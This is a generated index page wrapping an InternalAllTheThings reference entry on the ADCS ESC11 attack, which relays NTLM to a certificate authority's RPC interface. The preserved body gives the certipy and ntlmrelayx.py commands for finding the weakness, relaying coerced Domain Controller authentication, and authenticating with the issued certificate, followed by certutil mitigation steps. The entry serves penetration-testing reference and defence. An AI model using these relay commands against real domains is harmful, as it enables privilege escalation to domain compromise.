---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC11

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc11` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc11.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC11](../../topics/active-directory/active-directory-certificate-esc11.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc11 |
| name | Active Directory - Certificate ESC11 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc11.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC11\n\n## ESC11 - Relaying NTLM to ICPR\n\n> Encryption is not enforced for ICPR\
  \ requests and Request Disposition is set to Issue.\n\n**Tools**:\n\n* [ly4k/Certipy](https://github.com/ly4k/Certipy) -\
  \ Certipy official\n* [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy fork\n* [sploutchy/impacket](https://github.com/sploutchy/impacket)\
  \ - Impacket fork\n\n**Exploitation**:\n\n1. Look for `Enforce Encryption for Requests: Disabled` in certipy output.\n\n\
  \    ```ps1\n    certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout\n    Enforce Encryption for\
  \ Requests : Disabled\n    ESC11: Encryption is not enforced for ICPR (RPC) requests.\n    ```\n\n2. Setup a relay using\
  \ Impacket ntlmrelay and trigger a connection to it.\n\n    ```ps1\n    certipy relay -target rpc://dc.domain.local -ca\
  \ 'DOMAIN-CA' -template DomainController\n    # or\n    ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name\
  \ lab-DC-CA -smb2support\n    ```\n\n3. Coerce authentication fomr a privileged account such as a Domain Controller.\n4.\
  \ Use the certificate\n\n    ```ps1\n    certipy auth -pfx dc.pfx\n    ```\n\n**Mitigations**:\n\nEnforce **RPC Encryption**\
  \ (Packet Privacy).\n\n```powershell\ncertutil -getreg CA\\InterfaceFlags\ncertutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST\n\
  net stop certsvc\nnet start certsvc\n```\n\n## References\n\n* [ESC11: NTLM Relay to AD CS RPC Interface - Oliver Lyak -\
  \ May 15, 2025](https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation#esc11-ntlm-relay-to-ad-cs-rpc-interface)\n\
  * [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)\n\
  * [Relaying to AD Certificate Services over RPC - SYLVAIN HEINIGER - November 16, 2022](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)"
_relative_path: active-directory/ad-adcs-esc11.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc11.md
````
